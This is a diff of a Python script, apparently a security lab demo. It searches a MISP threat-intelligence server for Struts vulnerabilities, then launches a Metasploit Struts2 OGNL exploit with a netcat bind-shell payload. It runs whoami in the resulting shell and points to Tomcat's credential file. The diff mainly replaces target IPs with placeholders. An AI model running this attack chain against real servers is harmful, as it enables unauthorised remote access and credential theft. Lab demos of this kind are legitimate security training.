@@ -19,14 +19,14 @@ sleep_time = 1
 metasploit_login = os.environ['metasploit_login_id']
 exploit_module = "exploit/multi/http/struts2_content_type_ognl"
 payload = "cmd/unix/bind_netcat"
-remote_ip = "192.168.1.66"
+remote_ip = "x.x.x.x"
 remote_port = "8080"
 target_uri = "/struts2_2.3.15.1-showcase/showcase.action"
 sessionid = 0
 active_shell = True
 #----------------------------------------------------------------------------------------
 # search threat intel platform for actionable intels
-misp_api_endpoint = 'http://192.168.1.136/events/index'
+misp_api_endpoint = 'http://x.x.x.x/events/index'
 misp_key = os.environ['misp_key']
 misp_verifycert = False
 relative_path = ''
@@ -38,6 +38,7 @@ body = ('{"searchinfo":"%s", "searchpublished":1, "searchdistribution":0, "searc
 misp = PyMISP(misp_api_endpoint, misp_key, misp_verifycert)
 search_results = misp.direct_call(relative_path, body)
 data = json.dumps(search_results,sort_keys=True,indent=4)
+
 print ("\nSearching MISP Threat Intelligence Platform for 'struts' vulnerability... ")
 time.sleep(sleep_time)
 print (data)
@@ -213,7 +214,7 @@ if current_session >= 1:
     shell = msfrpc_obj.sessions.session(sessionid)
     shell.write('whoami\n')
     print ("Current user: ", shell.read())
-    print ("Tomcat Users Location: usr/local/tomcat/conf/tomcat-users.xml")
+    print ("Tomcat Users Location: /usr/local/tomcat/conf/tomcat-users.xml")
     print ("\n")
 else:
     print ("Oops! something went wrong! Check sessionID")
